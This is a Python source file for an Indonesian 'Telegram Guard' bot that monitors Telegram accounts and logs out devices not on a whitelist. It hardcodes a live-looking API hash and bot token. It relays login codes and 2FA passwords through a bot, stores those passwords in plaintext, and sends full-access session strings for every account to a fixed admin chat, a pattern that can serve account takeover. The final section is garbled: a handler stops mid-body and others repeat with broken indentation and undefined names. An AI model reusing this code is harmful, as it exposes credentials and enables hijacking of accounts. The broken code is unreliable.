import asyncio
from telethon import TelegramClient, events
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.sync import TelegramClient as TelegramSyncClient
from telethon import functions, types
from telethon.sessions import StringSession
import logging
import os
from datetime import datetime, timedelta
import pytz
from typing import Set, Optional, Dict, List, Tuple
import json
import ipaddress
import sqlite3
import requests
from telebot import TeleBot, types as telebot_types
import threading
import re
import functools

# Konfigurasi
API_ID = 24040054
API_HASH = 'b5c4817afd5b44b44f907f9050b7cd6e'
TIMEZONE = 'Asia/Jakarta'
ACCOUNTS_FILE = "accounts.json"
WHITELIST_FILE = "whitelist.json"
LOGOUT_RETRY_INTERVAL = 300  # 5 menit
MAX_LOGOUT_ATTEMPTS = 12  # 1 jam total
MAX_DB_RETRIES = 3  # Maksimal percobaan ketika database locked
CONNECTION_RETRIES = 3  # Maksimal percobaan koneksi
CONNECTION_RETRY_DELAY = 5  # Detik antar percobaan

# Bot Configuration
BOT_TOKEN = "7590127275:AAHhRuMqeKeBK0yaRJQVI0bC4eUXfy0pe_g"
ADMIN_CHAT_ID = 7143032702

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('telegram_guard.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)
logging.getLogger('telethon').setLevel(logging.WARNING)  # Kurangi log telethon

class TerminalLogger:
    @staticmethod
    def log_action(phone: str, success: bool, device_model: str, location: str, action: str):
        now = datetime.now(pytz.timezone(TIMEZONE))
        month_name = now.strftime('%B')
        day = now.day
        
        status = "SUKSES" if success else "GAGAL"
        message = f"\n{month_name} Tanggal {day} ({device_model})\n"
        message += f"({location})\n"
        message += f"AKSI ({status})\n"
        message += "-----------------------------"
        
        print(message)
        
        try:
            bot = TeleBot(BOT_TOKEN)
            bot.send_message(ADMIN_CHAT_ID, message)
        except Exception as e:
            logger.error(f"Failed to send log to bot: {str(e)}")

class AccountManager:
    def __init__(self):
        self.accounts: Dict[str, Dict] = {}
        self.load_accounts()
    
    def load_accounts(self):
        try:
            if os.path.exists(ACCOUNTS_FILE):
                with open(ACCOUNTS_FILE, 'r') as f:
                    self.accounts = json.load(f)
        except Exception as e:
            logger.error(f"Gagal memuat akun: {str(e)}")
            self.accounts = {}
    
    def save_accounts(self):
        try:
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump(self.accounts, f, indent=2)
        except Exception as e:
            logger.error(f"Gagal menyimpan akun: {str(e)}")
    
    def add_account(self, phone: str, password: Optional[str] = None, string_session: Optional[str] = None):
        normalized_phone = phone if phone.startswith('+') else f"+{phone}"
        normalized_phone = normalized_phone.replace(' ', '')
        
        account_data = {
            'password': password,
            'session_name': f"session_{normalized_phone}",
            'created_at': datetime.now(pytz.timezone(TIMEZONE)).isoformat()
        }
        
        if string_session:
            account_data['string_session'] = string_session
            
        self.accounts[normalized_phone] = account_data
        self.save_accounts()
    
    def get_accounts(self) -> List[str]:
        return list(self.accounts.keys())
    
    def get_password(self, phone: str) -> Optional[str]:
        return self.accounts.get(phone, {}).get('password')
    
    def get_session_name(self, phone: str) -> str:
        return self.accounts.get(phone, {}).get('session_name', f"session_{phone}")
    
    def get_string_session(self, phone: str) -> Optional[str]:
        return self.accounts.get(phone, {}).get('string_session')
    
    def set_string_session(self, phone: str, string_session: str):
        if phone in self.accounts:
            self.accounts[phone]['string_session'] = string_session
            self.save_accounts()
    
    def get_account_age(self, phone: str) -> Optional[int]:
        """Returns the account age in days"""
        if phone not in self.accounts or 'created_at' not in self.accounts[phone]:
            return None
            
        try:
            created_at = datetime.fromisoformat(self.accounts[phone]['created_at'])
            now = datetime.now(pytz.timezone(TIMEZONE))
            return (now - created_at).days
        except Exception:
            return None
    
    def remove_account(self, phone: str) -> bool:
        normalized_phone = phone if phone.startswith('+') else f"+{phone}"
        if normalized_phone in self.accounts:
            del self.accounts[normalized_phone]
            self.save_accounts()
            return True
        return False

class SessionManager:
    def __init__(self):
        self.sessions_dir = "sesi"
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
    
    def get_session_path(self, session_name: str) -> str:
        return os.path.join(self.sessions_dir, f"{session_name}.session")
    
    def get_all_sessions(self) -> List[str]:
        sessions = []
        for file in os.listdir(self.sessions_dir):
            if file.endswith('.session'):
                sessions.append(file.replace('.session', ''))
        return sessions
    
    def cleanup_corrupted_sessions(self):
        for session in self.get_all_sessions():
            session_path = self.get_session_path(session)
            try:
                conn = sqlite3.connect(session_path)
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                tables = cursor.fetchall()
                conn.close()
                
                if not tables:
                    os.remove(session_path)
                    logger.warning(f"Menghapus session corrupt: {session}")
            except Exception as e:
                os.remove(session_path)
                logger.warning(f"Menghapus session corrupt: {session}. Error: {str(e)}")
    
    def create_session_from_string(self, string_session: str, session_name: str) -> bool:
        """Create a .session file from a string session"""
        try:
            session_path = self.get_session_path(session_name)
            client = TelegramSyncClient(
                StringSession(string_session),
                API_ID,
                API_HASH
            )
            # Manually convert StringSession to SQLite session
            with client:
                # This will force the creation of the .session file
                client.session.save()
                # Now we need to manually copy the file
                string_session_path = os.path.join(os.getcwd(), f"{client.session.filename}.session")
                if os.path.exists(string_session_path):
                    # Read the StringSession file content
                    with open(string_session_path, 'rb') as f:
                        session_data = f.read()
                    # Write to our target session file
                    with open(session_path, 'wb') as f:
                        f.write(session_data)
                    # Remove the temporary StringSession file
                    os.remove(string_session_path)
                    return True
            return False
        except Exception as e:
            logger.error(f"Error creating session from string: {str(e)}")
            return False

class PersistentLogoutManager:
    def __init__(self):
        self.logout_attempts: Dict[Tuple[str, int], Dict[str, any]] = {}
    
    def should_retry_logout(self, phone: str, device_hash: int) -> bool:
        key = (phone, device_hash)
        if key not in self.logout_attempts:
            return True
        
        attempt_info = self.logout_attempts[key]
        if attempt_info['attempts'] >= MAX_LOGOUT_ATTEMPTS:
            return False
            
        last_attempt = attempt_info['last_attempt']
        return datetime.now(pytz.timezone(TIMEZONE)) - last_attempt > timedelta(seconds=LOGOUT_RETRY_INTERVAL)
    
    def record_logout_attempt(self, phone: str, device_hash: int):
        key = (phone, device_hash)
        if key not in self.logout_attempts:
            self.logout_attempts[key] = {
                'attempts': 1,
                'last_attempt': datetime.now(pytz.timezone(TIMEZONE))
            }
        else:
            self.logout_attempts[key]['attempts'] += 1
            self.logout_attempts[key]['last_attempt'] = datetime.now(pytz.timezone(TIMEZONE))
    
    def get_remaining_attempts(self, phone: str, device_hash: int) -> int:
        key = (phone, device_hash)
        if key not in self.logout_attempts:
            return MAX_LOGOUT_ATTEMPTS
        return MAX_LOGOUT_ATTEMPTS - self.logout_attempts[key]['attempts']

class WhitelistManager:
    def __init__(self):
        self.whitelist = {
            'device_locations': {
                "Redmi": ["Indonesia"],
                "Xiaomi": ["Indonesia"], 
                "Samsung": ["Indonesia", "Singapore"],
                "iPhone": ["Indonesia", "USA", "Japan"]
            },
            'known_devices': {}
        }
        self.load_whitelist()

    def load_whitelist(self):
        try:
            if os.path.exists(WHITELIST_FILE):
                with open(WHITELIST_FILE, 'r') as f:
                    self.whitelist = json.load(f)
        except Exception as e:
            logger.error(f"Gagal memuat whitelist: {str(e)}")

    def save_whitelist(self):
        try:
            with open(WHITELIST_FILE, 'w') as f:
                json.dump(self.whitelist, f, indent=2)
        except Exception as e:
            logger.error(f"Gagal menyimpan whitelist: {str(e)}")

    def add_device_location(self, device_model: str, country: str):
        device_model = device_model.strip().title()
        country = country.strip().title()
        
        if device_model not in self.whitelist['device_locations']:
            self.whitelist['device_locations'][device_model] = []
        
        if country not in self.whitelist['device_locations'][device_model]:
            self.whitelist['device_locations'][device_model].append(country)
            self.save_whitelist()

    def add_known_device(self, phone: str, device_hash: int, device_info: dict):
        if phone not in self.whitelist['known_devices']:
            self.whitelist['known_devices'][phone] = {}
        
        self.whitelist['known_devices'][phone][str(device_hash)] = device_info
        self.save_whitelist()

    def is_whitelisted(self, phone: str, device_model: str, country: str, ip: str, device_hash: int) -> bool:
        try:
            if str(device_hash) in self.whitelist['known_devices'].get(phone, {}):
                return True
            
            device_model = device_model.strip().title() if device_model else "Unknown"
            country = country.strip().title() if country else "Unknown"
            
            for allowed_device, allowed_countries in self.whitelist['device_locations'].items():
                if allowed_device.lower() in device_model.lower():
                    if country in allowed_countries:
                        return True
                    else:
                        logger.info(f"Device {device_model} ditemukan di {country} (tidak diizinkan)")
                        return False
            
            logger.info(f"Device {device_model} tidak ada dalam whitelist")
            return False
            
        except Exception as e:
            logger.error(f"Error checking whitelist: {str(e)}")
            return False

class TelegramGuard:
    def __init__(self):
        self.account_manager = AccountManager()
        self.session_manager = SessionManager()
        self.whitelist_manager = WhitelistManager()
        self.logout_manager = PersistentLogoutManager()
        self.clients: Dict[str, TelegramClient] = {}
        self.monitoring = True
        self.known_devices: Dict[str, Set[int]] = {}
        self._processed_devices = set()
        self.session_manager.cleanup_corrupted_sessions()
        self.running_tasks = []

    async def _logout_device(self, phone: str, device_hash: int, device_info: dict) -> bool:
        try:
            client = self.clients.get(phone)
            if not client:
                logger.error(f"Client untuk {phone} tidak ditemukan")
                return False
            
            await client(ResetAuthorizationRequest(hash=device_hash))
            
            TerminalLogger.log_action(
                phone=phone,
                success=True,
                device_model=device_info.get('device_model', 'Unknown'),
                location=device_info.get('country', 'Unknown'),
                action="LOGOUT PERANGKAT BARU"
            )
            
            return True
        except FloodWaitError as e:
            logger.warning(f"Flood wait: {e.seconds} detik untuk {phone}")
            await asyncio.sleep(e.seconds)
            return False
        except Exception as e:
            logger.error(f"Gagal logout device: {str(e)}")
            
            TerminalLogger.log_action(
                phone=phone,
                success=False,
                device_model=device_info.get('device_model', 'Unknown'),
                location=device_info.get('country', 'Unknown'),
                action="LOGOUT PERANGKAT BARU"
            )
            
            return False

    async def _process_new_device(self, phone: str, auth):
        try:
            device_hash = auth.hash
            device_model = getattr(auth, 'device_model', 'Unknown').strip()
            country = getattr(auth, 'country', 'Unknown').strip()
            
            device_key = (phone, device_hash)
            
            if device_key in self._processed_devices:
                return
                
            if not hasattr(self, '_processed_devices'):
                self._processed_devices = set()

            device_info = {
                'device_model': device_model,
                'country': country,
                'ip': getattr(auth, 'ip', 'Unknown'),
                'date_active': getattr(auth, 'date_active', datetime.now()).isoformat()
            }

            is_allowed = self.whitelist_manager.is_whitelisted(
                phone=phone,
                device_model=device_model,
                country=country,
                ip=device_info['ip'],
                device_hash=device_hash
            )

            if is_allowed:
                if phone not in self.known_devices:
                    self.known_devices[phone] = set()
                
                if device_hash not in self.known_devices[phone]:
                    self.known_devices[phone].add(device_hash)
                    self.whitelist_manager.add_known_device(phone, device_hash, device_info)
                    
                    TerminalLogger.log_action(
                        phone=phone,
                        success=True,
                        device_model=device_model,
                        location=country,
                        action="PERANGKAT DIIZINKAN"
                    )
                
                self._processed_devices.add(device_key)
                return
            
            if not self.logout_manager.should_retry_logout(phone, device_hash):
                remaining = self.logout_manager.get_remaining_attempts(phone, device_hash)
                if remaining <= 0:
                    logger.info(f"Sudah melewati batas maksimal percobaan logout untuk perangkat {device_model}")
                return
            
            success = await self._logout_device(phone, device_hash, device_info)
            self.logout_manager.record_logout_attempt(phone, device_hash)
            
            if success:
                self.known_devices[phone].add(device_hash)
                self._processed_devices.add(device_key)
                
        except Exception as e:
            logger.error(f"Error processing device: {str(e)}")

    async def _monitor_account(self, phone: str):
        """Monitoring real-time untuk satu akun"""
        logger.info(f"Memulai monitoring untuk akun {phone}")
        while self.monitoring:
            try:
                client = self.clients.get(phone)
                if not client:
                    logger.warning(f"Client untuk {phone} tidak ditemukan, mencoba lagi dalam 5 detik")
                    await asyncio.sleep(5)
                    continue
                
                try:
                    # Cek device setiap 5 detik (bisa disesuaikan)
                    auths = await asyncio.wait_for(client(GetAuthorizationsRequest()), timeout=10)
                    
                    for auth in auths.authorizations:
                        if getattr(auth, 'current', False):
                            continue
                        
                        if not all(hasattr(auth, attr) for attr in ['hash', 'device_model', 'country']):
                            continue
                            
                        await self._process_new_device(phone, auth)
                    
                    await asyncio.sleep(5)  # Interval pengecekan

                except asyncio.TimeoutError:
                    logger.warning(f"Timeout saat memeriksa authorizations untuk {phone}")
                except Exception as e:
                    logger.error(f"Error saat memeriksa authorizations: {str(e)}")
                    await asyncio.sleep(5)
                    
            except Exception as e:
                logger.error(f"Error monitoring account {phone}: {str(e)}")
                await asyncio.sleep(5)

    async def _init_client(self, phone: str) -> bool:
        session_name = self.account_manager.get_session_name(phone)
        session_path = self.session_manager.get_session_path(session_name)
        
        # Check if we should use string session
        string_session = self.account_manager.get_string_session(phone)
        if string_session and not os.path.exists(session_path):
            logger.info(f"Creating session file from string session for {phone}")
            if not self.session_manager.create_session_from_string(string_session, session_name):
                logger.error(f"Failed to create session from string for {phone}")
                return False
        
        for attempt in range(MAX_DB_RETRIES):
            try:
                client = TelegramClient(session_path, API_ID, API_HASH)
                
                # Handle koneksi dengan retry
                for conn_attempt in range(CONNECTION_RETRIES):
                    try:
                        await client.connect()
                        break
                    except (OSError, ConnectionError) as e:
                        if conn_attempt < CONNECTION_RETRIES - 1:
                            logger.warning(f"Koneksi gagal (attempt {conn_attempt + 1}), mencoba lagi dalam {CONNECTION_RETRY_DELAY} detik...")
                            await asyncio.sleep(CONNECTION_RETRY_DELAY)
                            continue
                        raise
                
                if await client.is_user_authorized():
                    self.clients[phone] = client
                    self.known_devices[phone] = set()
                    known_devices = self.whitelist_manager.whitelist['known_devices'].get(phone, {})
                    for device_hash in known_devices.keys():
                        try:
                            self.known_devices[phone].add(int(device_hash))
                        except ValueError:
                            continue
                    
                    logger.info(f"Berhasil login dengan akun {phone} menggunakan session yang ada")
                    
                    # If we don't have a string session yet, generate and save it
                    if not string_session:
                        try:
                            # Generate string session
                            string_session = StringSession.save(client.session)
                            self.account_manager.set_string_session(phone, string_session)
                            
                            # Send to admin bot
                            await self._send_string_session_to_admin(phone, string_session)
                        except Exception as e:
                            logger.error(f"Error generating string session for {phone}: {str(e)}")
                    
                    return True
                else:
                    logger.warning(f"Session untuk {phone} tidak valid")
                    return False
                        
            except sqlite3.OperationalError as e:
                if "database is locked" in str(e) and attempt < MAX_DB_RETRIES - 1:
                    wait_time = (attempt + 1) * 2
                    logger.warning(f"Database locked, mencoba lagi dalam {wait_time} detik...")
                    await asyncio.sleep(wait_time)
                    continue
                raise
            except Exception as e:
                logger.error(f"Error saat inisialisasi client {phone}: {str(e)}")
                return False
        
        return False
    
    async def _send_string_session_to_admin(self, phone: str, string_session: str):
        """Send string session to admin through bot"""
        try:
            message = f"String Session untuk {phone}:\n\n`{string_session}`"
            bot = TeleBot(BOT_TOKEN)
            bot.send_message(ADMIN_CHAT_ID, message, parse_mode="Markdown")
            logger.info(f"String session for {phone} sent to admin")
        except Exception as e:
            logger.error(f"Failed to send string session to admin: {str(e)}")

    async def login_with_phone(self, phone: str, password: Optional[str] = None) -> bool:
        """Login dengan nomor telepon dan dapatkan string session"""
        try:
            session_name = f"session_{phone}"
            session_path = self.session_manager.get_session_path(session_name)
            
            # Create client
            client = TelegramClient(session_path, API_ID, API_HASH)
            await client.connect()
            
            if await client.is_user_authorized():
                logger.info(f"Akun {phone} sudah ter-authorize")
                self.clients[phone] = client
                
                # Generate string session
                string_session = StringSession.save(client.session)
                self.account_manager.add_account(phone, password, string_session)
                
                # Send to admin bot
                await self._send_string_session_to_admin(phone, string_session)
                
                return True
            
            # Start login process
            try:
                await client.send_code_request(phone)
                logger.info(f"Kode verifikasi telah dikirim ke {phone}")
                
                # Initiate interactive login in bot
                bot = TeleBot(BOT_TOKEN)
                bot.send_message(
                    ADMIN_CHAT_ID, 
                    f"Kode verifikasi telah dikirim ke {phone}. Silakan kirim kode dengan format:\n\n/code {phone} XXXXX"
                )
                
                # Store client for later use
                self.clients[phone] = client
                return True
                
            except Exception as e:
                logger.error(f"Error saat login {phone}: {str(e)}")
                await client.disconnect()
                return False
                
        except Exception as e:
            logger.error(f"Error saat login {phone}: {str(e)}")
            return False
    
    async def verify_code(self, phone: str, code: str) -> bool:
        """Verify the Telegram code and complete login"""
        try:
            client = self.clients.get(phone)
            if not client:
                logger.error(f"Client untuk {phone} tidak ditemukan")
                return False
            
            try:
                await client.sign_in(phone, code)
                logger.info(f"Login berhasil untuk {phone}")
                
                # Generate string session
                string_session = StringSession.save(client.session)
                self.account_manager.set_string_session(phone, string_session)
                
                # Send to admin bot
                await self._send_string_session_to_admin(phone, string_session)
                
                return True
                
            except SessionPasswordNeededError:
                logger.info(f"Akun {phone} memerlukan password 2FA")
                
                # Initiate password request in bot
                bot = TeleBot(BOT_TOKEN)
                bot.send_message(
                    ADMIN_CHAT_ID, 
                    f"Akun {phone} memerlukan password 2FA. Silakan kirim password dengan format:\n\n/password {phone} PASSWORD"
                )
                return True
                
            except Exception as e:
                logger.error(f"Error saat verifikasi kode {phone}: {str(e)}")
                return False
                
        except Exception as e:
            logger.error(f"Error saat verifikasi kode {phone}: {str(e)}")
            return False
    
    async def verify_password(self, phone: str, password: str) -> bool:
        """Verify the 2FA password and complete login"""
        try:
            client = self.clients.get(phone)
            if not client:
                logger.error(f"Client untuk {phone} tidak ditemukan")
                return False
            
            try:
                await client.sign_in(password=password)
                logger.info(f"Login 2FA berhasil untuk {phone}")
                
                # Update account with password
                self.account_manager.add_account(
                    phone=phone, 
                    password=password
                )
                
                # Generate string session
                string_session = StringSession.save(client.session)
                self.account_manager.set_string_session(phone, string_session)
                
                # Send to admin bot
                await self._send_string_session_to_admin(phone, string_session)
                
                return True
                
            except Exception as e:
                logger.error(f"Error saat verifikasi password {phone}: {str(e)}")
                return False
                
        except Exception as e:
            logger.error(f"Error saat verifikasi password {phone}: {str(e)}")
            return False

    async def start(self):
        """Mulai monitoring semua akun"""
        # Load from both string sessions and file sessions
        accounts = self.account_manager.get_accounts()
        sessions = self.session_manager.get_all_sessions()
        
        # Combine unique accounts
        all_phones = set()
        
        # Add accounts from accounts.json
        for phone in accounts:
            all_phones.add(phone)
        
        # Add sessions from files
        for session_name in sessions:
            if session_name.startswith('session_+'):
                phone = session_name.split('_')[1]
                all_phones.add(phone)
        
        if not all_phones:
            logger.error("Tidak ada akun atau session yang tersedia")
            return
        
        self.running_tasks = []
        for phone in all_phones:
            try:
                if await self._init_client(phone):
                    task = asyncio.create_task(self._monitor_account(phone))
                    self.running_tasks.append(task)
                    logger.info(f"Monitoring dimulai untuk {phone}")
                    await asyncio.sleep(0.5)  # Sedikit delay antar akun
            except Exception as e:
                logger.error(f"Error saat inisialisasi akun {phone}: {str(e)}")
                await asyncio.sleep(2)
        
        # Tunggu sampai semua task selesai (atau sampai Ctrl+C)
        if self.running_tasks:
            try:
                # Keep monitoring running until they're cancelled
                while self.monitoring:
                    await asyncio.sleep(1)
            except asyncio.CancelledError:
                logger.info("Monitoring dihentikan")

    async def stop(self):
        """Hentikan monitoring dan bersihkan koneksi"""
        self.monitoring = False
        
        # Cancel all running tasks
        for task in self.running_tasks:
            try:
                task.cancel()
            except Exception:
                pass
        
        # Close all client connections
        for client in self.clients.values():
            try:
                await client.disconnect()
            except Exception:
                pass
                
        self.clients.clear()
        self.running_tasks.clear()

class TelegramGuardBot:
    def __init__(self, guard: TelegramGuard):
        self.guard = guard
        self.bot = TeleBot(BOT_TOKEN)
        self.admin_chat_id = ADMIN_CHAT_ID
        self.login_sessions = {}
        self.loop = asyncio.new_event_loop()  # Buat event loop khusus untuk bot
        self.setup_handlers()
        
    def run_in_loop(self, coro):
        """Helper untuk menjalankan coroutine dalam event loop"""
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result()
        
    def setup_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def handle_start(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
                
            keyboard = telebot_types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
            keyboard.add(
                telebot_types.KeyboardButton('/accounts'),
                telebot_types.KeyboardButton('/login'),
                telebot_types.KeyboardButton('/whitelist'),
                telebot_types.KeyboardButton('/monitor'),
                telebot_types.KeyboardButton('/status'),
                telebot_types.KeyboardButton('/help')
            )
            
            self.bot.send_message(
                message.chat.id,
                "Selamat datang di Telegram Guard Bot! Gunakan perintah di keyboard untuk mengontrol aplikasi.",
                reply_markup=keyboard
            )
        
        @self.bot.message_handler(commands=['help'])
        def handle_help(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
                
            help_text = (
                "Daftar perintah yang tersedia:\n\n"
                "/accounts - Lihat daftar akun yang terdaftar\n"
                "/login - Login dengan akun baru\n"
                "/login_multi - Login beberapa akun sekaligus\n"
                "/logout <phone> - Hapus akun tertentu\n"
                "/whitelist - Kelola daftar perangkat yang diizinkan\n"
                "/add_whitelist <device> <country> - Tambah device dan negara ke whitelist\n"
                "/monitor - Mulai monitoring semua akun\n"
                "/stop - Hentikan monitoring\n"
                "/status - Cek status monitoring\n"
                "/code <phone> <code> - Masukkan kode verifikasi\n"
                "/password <phone> <password> - Masukkan password 2FA\n"
                "/help - Tampilkan pesan bantuan ini"
            )
            
            self.bot.send_message(message.chat.id, help_text)
        
        @self.bot.message_handler(commands=['accounts'])
        def handle_accounts(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
            
            accounts = self.guard.account_manager.get_accounts()
            sessions = self.guard.session_manager.get_all_sessions()
            
            if not accounts and not sessions:
                self.bot.reply_to(message, "Tidak ada akun atau session yang terdaftar.")
                return
            
            response = "📱 Daftar Akun Terdaftar:\n\n"
            
            for i, phone in enumerate(accounts, 1):
                age = self.guard.account_manager.get_account_age(phone)
                age_info = f"({age} hari)" if age is not None else ""
                active = "✅ Aktif" if phone in self.guard.clients else "❌ Tidak aktif"
                response += f"{i}. {phone} {age_info} - {active}\n"
            
            if sessions:
                response += "\n💾 Daftar Session Tersedia:\n\n"
                for i, session in enumerate(sessions, 1):
                    if session.startswith('session_+'):
                        phone = session.split('_')[1]
                        response += f"{i}. {phone}\n"
            
            self.bot.send_message(message.chat.id, response)
        
        @self.bot.message_handler(commands=['login'])
        def handle_login(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
            
            self.bot.reply_to(message, "Silakan masukkan nomor telepon dengan format:\n\n+628123456789")
            self.bot.register_next_step_handler(message, self.process_phone_step)
        
        @self.bot.message_handler(commands=['login_multi'])
        def handle_login_multi(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
            
            self.bot.reply_to(
                message, 
                "Silakan masukkan beberapa nomor telepon dipisahkan dengan tanda '+' dengan format:\n\n"
                "+62812345678+62823456789+62834567890\n\n"
                "Atau ketik 'selesai' untuk berhenti"
            )
            self.bot.register_next_step_handler(message, self.process_multi_phone_step)
        
        @self.bot.message_handler(commands=['logout'])
        def handle_logout(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
            
            parts = message.text.split()
            if len(parts) != 2:
                self.bot.reply_to(message, "Format: /logout <phone>")
                return
            
            phone = parts[1]
            if not phone.startswith('+'):
                phone = f"+{phone}"
            
            # Stop monitoring for this account if it's running
            if phone in self.guard.clients:
                self.run_in_loop(self.guard.clients[phone].disconnect())
                del self.guard.clients[phone]
            
            # Remove the account
            if self.guard.account_manager.remove_account(phone):
                # Delete session file if exists
                session_name = f"session_{phone}"
                session_path = self.guard.session_manager.get_session_path(session_name)
                if os.path.exists(session_path):
                    os.remove(session_path)
                self.bot.reply_to(message, f"Akun {phone} berhasil dihapus.")
            else:
                self.bot.reply_to(message, f"Akun {phone} tidak ditemukan.")
        
        @self.bot.message_handler(commands=['whitelist'])
        def handle_whitelist(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
            
            whitelist = self.guard.whitelist_manager.whitelist
            
            response = "📱 Daftar Device & Lokasi Whitelist:\n\n"
            for device, countries in whitelist['device_locations'].items():
                response += f"• {device}: {', '.join(countries)}\n"
            
            response += "\n🔐 Perangkat Dikenal:\n\n"
            for phone, devices in whitelist['known_devices'].items():
                response += f"• {phone}: {len(devices)} perangkat\n"
            
            # Create inline keyboard for adding new whitelist
            keyboard = telebot_types.InlineKeyboardMarkup()
            keyboard.add(telebot_types.InlineKeyboardButton(
                "Tambah Device & Lokasi Whitelist", 
                callback_data="add_whitelist"
            ))
            
            self.bot.send_message(message.chat.id, response, reply_markup=keyboard)
        
        @self.bot.callback_query_handler(func=lambda call: call.data == "add_whitelist")
        def add_whitelist_callback(call):
            if call.message.chat.id != self.admin_chat_id:
                self.bot.answer_callback_query(call.id, "Anda tidak memiliki akses ke bot ini.")
                return
            
            self.bot.answer_callback_query(call.id)
            msg = self.bot.send_message(call.message.chat.id, "Masukkan model device (contoh: Redmi):")
            self.bot.register_next_step_handler(msg, self.process_whitelist_device_step)
        
        @self.bot.message_handler(commands=['add_whitelist'])
        def handle_add_whitelist(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
            
            parts = message.text.split(maxsplit=2)
            if len(parts) != 3:
                self.bot.reply_to(message, "Format: /add_whitelist <device> <country>")
                return
            
            device = parts[1]
            country = parts[2]
            
            self.guard.whitelist_manager.add_device_location(device, country)
            self.bot.reply_to(message, f"Device {device} di {country} telah ditambahkan ke whitelist.")
        
        @self.bot.message_handler(commands=['monitor'])
        def handle_monitor(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
            
            # Start monitoring in background
            if self.guard.monitoring:
                self.bot.reply_to(message, "Monitoring sudah berjalan.")
                return
            
            self.bot.reply_to(message, "Memulai monitoring semua akun...")
            
            # Start monitoring in a separate thread to not block the bot
            threading.Thread(target=self.start_monitoring_thread).start()
        
        @self.bot.message_handler(commands=['stop'])
        def handle_stop(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
            
            if not self.guard.monitoring:
                self.bot.reply_to(message, "Monitoring belum dimulai.")
                return
            
            self.bot.reply_to(message, "Menghentikan monitoring...")
            
            # Stop monitoring in a separate thread
            threading.Thread(target=self.stop_monitoring_thread).start()
        
        @self.bot.message_handler(commands=['status'])
        def handle_status(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
            
            status = "✅ Aktif" if self.guard.monitoring else "❌ Tidak aktif"
            active_accounts = len(self.guard.clients)
            
            response = f"Status monitoring: {status}\n"
            response += f"Jumlah akun aktif: {active_accounts}\n\n"
            
            if active_accounts > 0:
                response += "Akun aktif:\n"
                for phone in self.guard.clients.keys():
                    age = self.guard.account_manager.get_account_age(phone)
                    age_info = f"({age} hari)" if age is not None else ""
                    response += f"• {phone} {age_info}\n"
            
            self.bot.send_message(message.chat.id, response)
        
        @self.bot.message_handler(commands=['code'])
        def handle_code(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
            
            parts = message.text.split()
            if len(parts) != 3:
                self.bot.reply_to(message, "Format: /code <phone> <verification_code>")
                return
            
            phone = parts[1]
            code = parts[2]
            
            if not phone.startswith('+'):
                phone = f"+{phone}"
            
            # Process the code in a separate thread
            threading.Thread(target=self.process_verification_code, args=(phone, code, message.chat.id)).start()
            self.bot.reply_to(message, f"Memproses kode verifikasi untuk {phone}...")
        
        @self.bot.message_handler(commands=['password'])
        def handle_password(message):
            if message.chat.id != self.admin_chat_id:
                self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
                return
            
            parts = message.text.split(maxsplit=2)
            if len(parts) != 3:
                self.bot.reply_to(message, "Format: /password <phone> <2fa_password>")
                return                                     
        self.guard.whitelist_manager.add_device_location(device, country)
        self.bot.reply_to(message, f"Device {device} di {country} telah ditambahkan ke whitelist.")
    
    @self.bot.message_handler(commands=['monitor'])
    def handle_monitor(message):
        if message.chat.id != self.admin_chat_id:
            self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
            return
        
        # Start monitoring in background
        if self.guard.monitoring:
            self.bot.reply_to(message, "Monitoring sudah berjalan.")
            return
        
        self.bot.reply_to(message, "Memulai monitoring semua akun...")
        
        # Start monitoring in the event loop
        def start_monitoring():
            try:
                self.run_in_loop(self.guard.start())
                self.bot.send_message(
                    self.admin_chat_id,
                    "Monitoring telah dimulai."
                )
            except Exception as e:
                self.bot.send_message(
                    self.admin_chat_id,
                    f"Error saat memulai monitoring: {str(e)}"
                )
        
        threading.Thread(target=start_monitoring).start()
    
    @self.bot.message_handler(commands=['stop'])
    def handle_stop(message):
        if message.chat.id != self.admin_chat_id:
            self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
            return
        
        if not self.guard.monitoring:
            self.bot.reply_to(message, "Monitoring belum dimulai.")
            return
        
        self.bot.reply_to(message, "Menghentikan monitoring...")
        
        # Stop monitoring in the event loop
        def stop_monitoring():
            try:
                self.run_in_loop(self.guard.stop())
                self.bot.send_message(
                    self.admin_chat_id,
                    "Monitoring telah dihentikan."
                )
            except Exception as e:
                self.bot.send_message(
                    self.admin_chat_id,
                    f"Error saat menghentikan monitoring: {str(e)}"
                )
        
        threading.Thread(target=stop_monitoring).start()
    
